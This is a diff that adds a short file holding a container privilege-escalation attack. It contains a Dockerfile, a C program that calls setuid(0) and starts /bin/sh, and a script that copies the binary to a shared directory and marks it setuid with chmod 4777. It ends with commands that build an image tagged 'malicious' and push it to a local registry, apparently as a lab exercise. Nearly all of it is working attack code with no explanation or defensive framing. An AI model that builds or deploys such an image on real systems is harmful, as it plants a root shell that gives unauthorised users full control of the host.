@@ -1,0 +1,34 @@
+########################################################
+# Dockerfile
+
+FROM alpine:latest
+COPY shellscript.sh shellscript.sh
+COPY shell shell
+
+#######################################################
+# shell.c
+
+int main()
+{
+  setuid(0);
+  system("/bin/sh");
+  return 0;
+}
+
+######################################################
+# shellscript.sh
+
+#!/bin/bash
+cp shell /shared/shell
+chmod 4777 /shared/shell
+
+#####################################################
+
+docker run -it -p 5000:5000 registry
+docker build . -t malicious
+docker tag malicious localhost:5000/malicious
+docker push localhost:5000/malicious
+
+####################################################
+
+
